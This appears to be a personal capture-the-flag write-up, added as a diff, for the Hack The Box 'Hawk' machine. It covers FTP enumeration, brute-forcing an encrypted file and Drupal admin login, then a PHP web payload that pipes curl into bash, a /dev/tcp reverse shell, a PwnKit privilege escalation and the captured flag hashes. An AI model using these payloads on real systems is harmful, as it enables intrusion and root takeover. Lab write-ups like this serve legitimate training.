@@ -1,0 +1,150 @@
+Hawk    10.10.10.102
+ttl 63 > Linux
+
+[+]Enumeration[+]
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.24
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
+|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
+|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+8082/tcp open  http    H2 database http console
+|_http-title: H2 Console
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+[+]Directory
+http://10.10.10.102/FUZZ
+
+/misc  
+/modules 
+/themes    
+/user  
+/scripts 
+/admin  
+/node  
+/sites  
+/includes
+/profiles
+/robots  
+/batch  
+   
+
+[+]Ftp Anonymous
+/messages > ls -a
+.drupal.txt.enc
+
+❯ file .drupal.txt.enc
+.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
+
+[+]Openssl BruteForce
+https://github.com/HrushikeshK/openssl-bruteforce
+
+❯ python3 brute.py /usr/share/wordlists/rockyou.txt ciphers.txt /home/kyra/Desktop/HackTheBox/Hawk/content/.drupal.txt.enc
+[*]friends
+
+❯ openssl enc -aes-256-cbc -a -d -in drupal.txt.enc  drupal.txt -k friends
+❯ cat drupal.txt
+
+Daniel,
+Following the password for the portal:
+PencilKeyboardScanner123
+Please let us know when the portal is ready.
+Kind Regards,
+
+IT department.
+
+[+]Credentials[+]
+User : Daniel
+Pass : PencilKeyboardScanner123
+
+http://10.10.10.102/admin
+user : admin
+pass : PencilKeyboardScanner123
+
+email = admin@hawk.local
+
+[+]Intrusion[+]
+http://10.10.10.102/node#overlay=admin/modules
+Active PHP Code
+
+http://10.10.10.102/node#overlay=node/add/article
+Add Article
+rce.php
+<?php
+    
+    {
+        system("ping -c 4 10.10.14.24");
+    }
+?>
+
+sudo tcpdump -i tun0 icmp
+4 icmp recived 
+
+[+]Revershell[+]
+
++ First create revershell.sh 
+revershell.sh >>
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
++ Share 
+sudo python3 -m http.server 80
+
++ Article Web Payload 
+<?php 
+  {
+    system("curl http://10.10.10.10/recershell.sh | bash");
+  }
+?>
+
++ Listen nc 
+sudo nc -lvnp 4444
+
+[+]Privilage Escalation[+]
+www-data@hawk:/var/www/html$ hostname -I
+10.10.10.10
+
+www-data@hawk:/home/daniel$ cat user.txt 
+640079287fe4ede49396441c97b084ab
+
+www-data@hawk:/home/daniel$ find / -perm /4000 2>/dev/null
+/usr/bin/pkexec
+
+www-data@hawk:/tmp$ wget http://10.10.14.24/PwnKit
+www-data@hawk:/tmp$ chmod +x PwnKit
+www-data@hawk:/tmp$ ./PwnKit 
+root@hawk:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+
+root@hawk:/tmp# cat /home/daniel/user.txt 
+640079287fe4ede49396441c97b084ab
+
+root@hawk:/tmp# cat /root/root.txt 
+121c536eb054cf96ec04a508b3392929
